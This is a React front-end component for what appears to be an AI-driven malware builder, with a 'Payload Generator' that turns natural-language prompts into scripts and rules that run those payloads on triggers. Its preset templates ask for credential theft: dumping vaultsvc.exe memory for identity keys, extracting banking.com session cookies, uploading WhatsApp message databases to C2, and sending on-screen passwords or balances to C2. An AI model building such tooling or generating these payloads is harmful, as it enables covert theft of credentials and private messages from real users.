import { useState } from "react";
import { useScripts, useGenerateScript, useCreateScript } from "@/hooks/use-scripts";
import { Layout } from "@/components/Layout";
import { CyberCard } from "@/components/CyberCard";
import { CyberButton } from "@/components/CyberButton";
import { Bot, Save, Code2, Sparkles, AlertCircle, Copy, Check, Zap, Plus, Trash2 } from "lucide-react";
import { cn } from "@/lib/utils";
import { useToast } from "@/hooks/use-toast";
import { useQuery, useMutation } from "@tanstack/react-query";
import { apiRequest, queryClient } from "@/lib/queryClient";
import { type AutomationRule, type InsertAutomationRule } from "@shared/schema";

export default function AgentBuilder() {
  const { toast } = useToast();
  const { data: scripts = [] } = useScripts();
  const { mutate: generate, isPending: isGenerating } = useGenerateScript();
  const { mutate: saveScript, isPending: isSaving } = useCreateScript();

  // Scripts State
  const [prompt, setPrompt] = useState("");
  const [targetOs, setTargetOs] = useState<"windows" | "android" | "linux">("windows");
  const [name, setName] = useState("");
  const [generatedCode, setGeneratedCode] = useState("");
  const [explanation, setExplanation] = useState("");
  const [hasCopied, setHasCopied] = useState(false);

  // Automation State
  const [ruleName, setRuleName] = useState("");
  const [ruleTrigger, setRuleTrigger] = useState("log_match");
  const [ruleCondition, setRuleCondition] = useState("");
  const [ruleScriptId, setRuleScriptId] = useState<string>("");

  const scenarios = [
    {
      id: "win-priv",
      title: "High-Privilege Process (Windows)",
      detection: "lsass.exe / vaultsvc.exe",
      suggestion: "Identity Provider Key Extraction",
      trigger: "log_match",
      condition: "vaultsvc.exe",
      prompt: "Dump memory of vaultsvc.exe and extract identity keys"
    },
    {
      id: "android-msg",
      title: "Messaging App (Android)",
      detection: "com.whatsapp / com.signal",
      suggestion: "Encrypted Message Backup",
      trigger: "app_start",
      condition: "com.whatsapp",
      prompt: "Navigate UI of WhatsApp and initiate a remote backup"
    },
    {
      id: "browser-tab",
      title: "Active Browser Tab",
      detection: "Specific domain in title",
      suggestion: "Session Persistence",
      trigger: "log_match",
      condition: "banking.com",
      prompt: "Locate and extract session cookies for banking.com"
    },
    {
      id: "wa-exfil",
      title: "WhatsApp Exfiltration (Android)",
      detection: "com.whatsapp active",
      suggestion: "WhatsApp Backup Harvester",
      trigger: "app_start",
      condition: "com.whatsapp",
      prompt: "Locate msgstore.db.crypt14 and upload to C2 storage"
    },
    {
      id: "ui-regex",
      title: "UI Text Monitor (Global)",
      detection: "Visible text matching regex",
      suggestion: "Sensitive Data Snatcher",
      trigger: "ui_element_visible",
      condition: "(secret|password|balance)",
      prompt: "Extract text from any UI element matching the regex and send to C2 logs"
    }
  ];

  const applyScenario = (scenario: typeof scenarios[0]) => {
    setRuleName(scenario.suggestion);
    setRuleTrigger(scenario.trigger);
    setRuleCondition(scenario.condition);
    setPrompt(scenario.prompt);
    setName(scenario.suggestion);
  };

  const { data: rules = [] } = useQuery<AutomationRule[]>({
    queryKey: ["/api/automation"],
  });

  const createRule = useMutation({
    mutationFn: async (rule: InsertAutomationRule) => {
      const res = await apiRequest("POST", "/api/automation", rule);
      return res.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/automation"] });
      toast({ title: "Automation Armed", description: "Rule deployed to grid." });
      setRuleName("");
      setRuleCondition("");
    }
  });

  const deleteRule = useMutation({
    mutationFn: async (id: number) => {
      await apiRequest("DELETE", `/api/automation/${id}`);
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/automation"] });
    }
  });

  const handleGenerate = (e: React.FormEvent) => {
    e.preventDefault();
    if (!prompt.trim() || !name.trim()) return;

    generate({ prompt, targetOs, name }, {
      onSuccess: (data) => {
        setGeneratedCode(data.code);
        setExplanation(data.explanation);
        toast({ title: "Generation Complete", description: "AI has forged your tool." });
      },
      onError: (err: any) => {
        toast({ title: "Generation Failed", description: err.message, variant: "destructive" });
      }
    });
  };

  const handleSaveScript = () => {
    if (!generatedCode || !name) return;
    saveScript({
      name,
      targetOs,
      code: generatedCode,
      description: prompt
    }, {
      onSuccess: () => {
        toast({ title: "Script Saved", description: "Added to your arsenal." });
      }
    });
  };

  const handleAddRule = (e: React.FormEvent) => {
    e.preventDefault();
    if (!ruleName || !ruleCondition) return;
    createRule.mutate({
      name: ruleName,
      trigger: ruleTrigger,
      condition: ruleCondition,
      action: "execute_script",
      scriptId: ruleScriptId ? parseInt(ruleScriptId) : null,
      isActive: true
    });
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generatedCode);
    setHasCopied(true);
    setTimeout(() => setHasCopied(false), 2000);
  };

  return (
    <Layout>
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 h-[calc(100vh-8rem)]">
        
        {/* Left Col: Input */}
        <div className="lg:col-span-1 space-y-6 overflow-auto pr-2">
          <CyberCard title="AUTOMATION LOGIC" icon={<Zap />}>
            <div className="mb-6 space-y-3">
              <label className="text-[10px] font-mono text-primary/40 uppercase tracking-widest">Rapid Deployment Templates</label>
              <div className="grid gap-2">
                {scenarios.map(s => (
                  <button
                    key={s.id}
                    onClick={() => applyScenario(s)}
                    className="text-left p-2 border border-primary/20 rounded bg-primary/5 hover:bg-primary/10 transition-colors group"
                  >
                    <p className="text-[10px] font-bold text-primary/80 group-hover:text-primary">{s.title}</p>
                    <p className="text-[9px] text-muted-foreground font-mono italic">Signature: {s.detection}</p>
                  </button>
                ))}
              </div>
            </div>

            <form onSubmit={handleAddRule} className="space-y-4">
              <div className="space-y-2">
                <label className="text-xs font-mono text-primary/80 uppercase">Automation Alias</label>
                <input 
                  value={ruleName}
                  onChange={(e) => setRuleName(e.target.value)}
                  className="w-full cyber-input"
                  placeholder="e.g. Auth Failure Monitor"
                  required
                />
              </div>

              <div className="grid grid-cols-2 gap-2">
                <div className="space-y-2">
                  <label className="text-xs font-mono text-primary/80 uppercase">Event Trigger</label>
                  <select 
                    value={ruleTrigger}
                    onChange={(e) => setRuleTrigger(e.target.value)}
                    className="w-full cyber-input bg-black"
                  >
                    <option value="log_match">LOG PATTERN</option>
                    <option value="app_start">PROCESS START</option>
                    <option value="ui_element_visible">UI DISCOVERY</option>
                  </select>
                </div>
                <div className="space-y-2">
                  <label className="text-xs font-mono text-primary/80 uppercase">Active Payload</label>
                  <select 
                    value={ruleScriptId}
                    onChange={(e) => setRuleScriptId(e.target.value)}
                    className="w-full cyber-input bg-black"
                  >
                    <option value="">NO PAYLOAD</option>
                    {scripts.map(s => (
                      <option key={s.id} value={s.id}>{s.name.toUpperCase()}</option>
                    ))}
                  </select>
                </div>
              </div>

              <div className="space-y-2">
                <label className="text-xs font-mono text-primary/80 uppercase">Intercept Condition (Regex/Selector)</label>
                <input 
                  value={ruleCondition}
                  onChange={(e) => setRuleCondition(e.target.value)}
                  className="w-full cyber-input"
                  placeholder="e.g. 'failed login' or ID:submit_btn"
                  required
                />
              </div>

              <CyberButton type="submit" className="w-full" variant="ghost" icon={<Plus className="w-4 h-4" />}>
                DEPLOY AUTOMATION
              </CyberButton>
            </form>

            <div className="mt-4 space-y-2 max-h-[200px] overflow-auto">
              {rules.map(rule => (
                <div key={rule.id} className="p-2 border border-primary/20 rounded bg-primary/5 flex items-center justify-between">
                  <div className="min-w-0">
                    <p className="text-xs font-bold text-primary truncate">{rule.name}</p>
                    <p className="text-[10px] text-muted-foreground font-mono truncate">{rule.trigger}: {rule.condition}</p>
                  </div>
                  <button 
                    onClick={() => deleteRule.mutate(rule.id)}
                    className="text-muted-foreground hover:text-destructive transition-colors p-1"
                  >
                    <Trash2 className="w-3 h-3" />
                  </button>
                </div>
              ))}
            </div>
          </CyberCard>

          <CyberCard title="PAYLOAD GENERATOR" icon={<Bot />}>
            <form onSubmit={handleGenerate} className="space-y-4">
               <div className="space-y-2">
                 <label className="text-xs font-mono text-primary/80 uppercase">Payload Identifier</label>
                 <input 
                   value={name}
                   onChange={(e) => setName(e.target.value)}
                   className="w-full cyber-input"
                   placeholder="e.g. Log Harvester"
                   required
                 />
               </div>

               <div className="space-y-2">
                 <label className="text-xs font-mono text-primary/80 uppercase">Target Architecture</label>
                 <div className="grid grid-cols-3 gap-2">
                    {["windows", "android", "linux"].map(os => (
                      <button
                        key={os}
                        type="button"
                        onClick={() => setTargetOs(os as any)}
                        className={cn(
                          "px-2 py-2 border rounded font-mono text-xs uppercase transition-all",
                          targetOs === os 
                            ? "bg-primary text-black border-primary font-bold shadow-[0_0_10px_rgba(0,255,65,0.4)]" 
                            : "bg-transparent border-border text-muted-foreground hover:border-primary/50 hover:text-primary"
                        )}
                      >
                        {os}
                      </button>
                    ))}
                 </div>
               </div>

               <div className="space-y-2">
                 <label className="text-xs font-mono text-primary/80 uppercase">Logic Definition</label>
                 <textarea 
                   value={prompt}
                   onChange={(e) => setPrompt(e.target.value)}
                   className="w-full cyber-input min-h-[120px] resize-none"
                   placeholder="Describe payload behavior in natural language..."
                   required
                 />
               </div>

               <CyberButton type="submit" className="w-full" isLoading={isGenerating} icon={<Sparkles className="w-4 h-4" />}>
                 FORGE PAYLOAD
               </CyberButton>
            </form>
          </CyberCard>
        </div>

        {/* Right Col: Output */}
        <div className="lg:col-span-2 flex flex-col h-full min-h-0">
           <CyberCard className="flex-1 flex flex-col p-0 overflow-hidden border-primary/20 h-full">
              <div className="p-4 border-b border-border bg-black/40 flex items-center justify-between">
                 <div className="flex items-center gap-2 text-primary font-mono text-sm">
                   <Code2 className="w-4 h-4" />
                   <span>PAYLOAD.JS</span>
                 </div>
                 <div className="flex gap-2">
                    <button 
                      onClick={copyToClipboard}
                      className="text-xs flex items-center gap-1 hover:text-primary transition-colors text-muted-foreground px-3 py-1 border border-border rounded"
                      disabled={!generatedCode}
                    >
                      {hasCopied ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                      {hasCopied ? "COPIED" : "COPY"}
                    </button>
                    <CyberButton 
                      onClick={handleSaveScript} 
                      disabled={!generatedCode || isSaving} 
                      icon={<Save className="w-3 h-3" />}
                      className="text-xs py-1 h-8"
                    >
                      SAVE
                    </CyberButton>
                 </div>
              </div>
              
              <div className="flex-1 bg-black/80 overflow-auto p-4 font-mono text-sm relative">
                {!generatedCode ? (
                  <div className="absolute inset-0 flex flex-col items-center justify-center text-muted-foreground/30 pointer-events-none">
                    <Bot className="w-24 h-24 mb-4 opacity-20" />
                    <p>AWAITING AI GENERATION...</p>
                  </div>
                ) : (
                  <pre className="text-green-400/90 whitespace-pre-wrap">
                    <code>{generatedCode}</code>
                  </pre>
                )}
              </div>

              {explanation && (
                <div className="p-4 bg-primary/5 border-t border-primary/20 text-xs font-mono text-primary/80">
                   <div className="flex items-center gap-2 mb-1 font-bold">
                     <AlertCircle className="w-3 h-3" />
                     ANALYSIS
                   </div>
                   {explanation}
                </div>
              )}
           </CyberCard>
        </div>
      </div>
    </Layout>
  );
}
